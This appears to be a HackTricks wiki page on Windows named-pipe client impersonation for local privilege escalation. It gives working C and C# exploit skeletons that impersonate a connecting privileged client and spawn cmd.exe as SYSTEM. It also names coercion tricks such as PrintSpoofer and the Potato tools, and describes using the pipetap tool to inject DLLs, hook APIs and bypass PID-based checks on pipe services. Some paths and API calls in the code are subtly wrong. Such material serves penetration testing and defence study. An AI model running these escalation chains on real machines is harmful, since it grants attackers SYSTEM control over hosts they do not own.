# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation is a local privilege escalation primitive that lets a named-pipe server thread adopt the security context of a client that connects to it. In practice, an attacker who can run code with SeImpersonatePrivilege can coerce a privileged client (e.g., a SYSTEM service) to connect to an attacker-controlled pipe, call ImpersonateNamedPipeClient, duplicate the resulting token into a primary token, and spawn a process as the client (often NT AUTHORITY\SYSTEM).

This page focuses on the core technique. For end-to-end exploit chains that coerce SYSTEM to your pipe, see the Potato family pages referenced below.

## TL;DR
- Create a named pipe: \\.\pipe\<random> and wait for a connection.
- Make a privileged component connect to it (spooler/DCOM/EFSRPC/etc.).
- Read at least one message from the pipe, then call ImpersonateNamedPipeClient.
- Open the impersonation token from the current thread, DuplicateTokenEx(TokenPrimary), and CreateProcessWithTokenW/CreateProcessAsUser to get a SYSTEM process.

## Requirements and key APIs
- Privileges typically needed by the calling process/thread:
  - SeImpersonatePrivilege to successfully impersonate a connecting client and to use CreateProcessWithTokenW.
  - Alternatively, after impersonating SYSTEM, you can use CreateProcessAsUser, which may require SeAssignPrimaryTokenPrivilege and SeIncreaseQuotaPrivilege (these are satisfied when you’re impersonating SYSTEM).
- Core APIs used:
  - CreateNamedPipe / ConnectNamedPipe
  - ReadFile/WriteFile (must read at least one message before impersonation)
  - ImpersonateNamedPipeClient and RevertToSelf
  - OpenThreadToken, DuplicateTokenEx(TokenPrimary)
  - CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: to perform useful actions locally, the client must allow SecurityImpersonation (default for many local RPC/named-pipe clients). Clients can lower this with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION when opening the pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
    LPCSTR pipe = "\\\\.\\pipe\\evil";
    HANDLE hPipe = CreateNamedPipeA(
        pipe,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 0, 0, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) return 1;

    // Wait for privileged client to connect (see Triggers section)
    if (!ConnectNamedPipe(hPipe, NULL)) return 2;

    // Read at least one message before impersonation
    char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

    // Impersonate the last message sender
    if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

    // Extract and duplicate the impersonation token into a primary token
    HANDLE impTok = NULL, priTok = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
    if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

    // Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
    STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
    if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
                                 L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
                                 0, NULL, NULL, &si, &pi)) {
        // Fallback: CreateProcessAsUser after you already impersonated SYSTEM
        CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
                             NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    }

    RevertToSelf(); // Restore original context
    return 0;
}
```
Notes:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), ensure you read from the pipe first and that the client didn’t restrict impersonation to Identification level.
- Prefer DuplicateTokenEx with SecurityImpersonation and TokenPrimary to create a primary token suitable for process creation.

## .NET quick example
In .NET, NamedPipeServerStream can impersonate via RunAsClient. Once impersonating, duplicate the thread token and create a process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
  [DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
  [DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
  [DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
  static void Main(){
    using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
    s.WaitForConnection();
    // Ensure client sent something so the token is available
    s.RunAsClient(() => {
      IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
      IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
      var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
      Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
    });
  }
}
```

## Common triggers/coercions to get SYSTEM to your pipe
These techniques coerce privileged services to connect to your named pipe so you can impersonate them:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Named-pipe hardened services can still be hijacked by instrumenting the trusted client. Tools like [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) drop a helper DLL into the client, proxy its traffic, and let you tamper with privileged IPC before the SYSTEM service consumes it.

### Inline API hooking inside trusted processes
- Inject the helper DLL (OpenProcess → CreateRemoteThread → LoadLibrary) into any client.
- The DLL Detours `ReadFile`, `WriteFile`, etc., but only when `GetFileType` reports `FILE_TYPE_PIPE`, copies each buffer/metadata to a control pipe, lets you edit/drop/replay it, then resumes the original API.
- Turns the legitimate client into a Burp-style proxy: pause UTF-8/UTF-16/raw payloads, trigger error paths, replay sequences, or export JSON traces.

### Remote client mode to defeat PID-based validation
- Inject into an allow-listed client, then in the GUI choose the pipe plus that PID.
- The DLL issues `CreateFile`/`ConnectNamedPipe` inside the trusted process and relays the I/O back to you, so the server still observes the legitimate PID/image.
- Bypasses filters that rely on `GetNamedPipeClientProcessId` or signed-image checks.

### Fast enumeration and fuzzing
- `pipelist` enumerates `\\.\pipe\*`, shows ACLs/SIDs, and forwards entries to other modules for immediate probing.
- The pipe client/message composer connects to any name and builds UTF-8/UTF-16/raw-hex payloads; import captured blobs, mutate fields, and resend to hunt deserializers or unauthenticated command verbs.
- The helper DLL can host a loopback TCP listener so tooling/fuzzers can drive the pipe remotely via the Python SDK.

```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```

Combine the TCP bridge with VM snapshot restores to crash-test fragile IPC parsers.

### Operational considerations
- Named pipes are low-latency; long pauses while editing buffers can deadlock brittle services.
- Overlapped/completion-port I/O coverage is partial, so expect edge cases.
- Injection is noisy and unsigned, so treat it as a lab/exploit-dev helper rather than a stealth implant.

## Troubleshooting and gotchas
- You must read at least one message from the pipe before calling ImpersonateNamedPipeClient; otherwise you’ll get ERROR_CANNOT_IMPERSONATE (1368).
- If the client connects with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, the server cannot fully impersonate; check the token’s impersonation level via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requires SeImpersonatePrivilege on the caller. If that fails with ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser after you already impersonated SYSTEM.
- Ensure your pipe’s security descriptor allows the target service to connect if you harden it; by default, pipes under \\.\pipe are accessible according to the server’s DACL.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
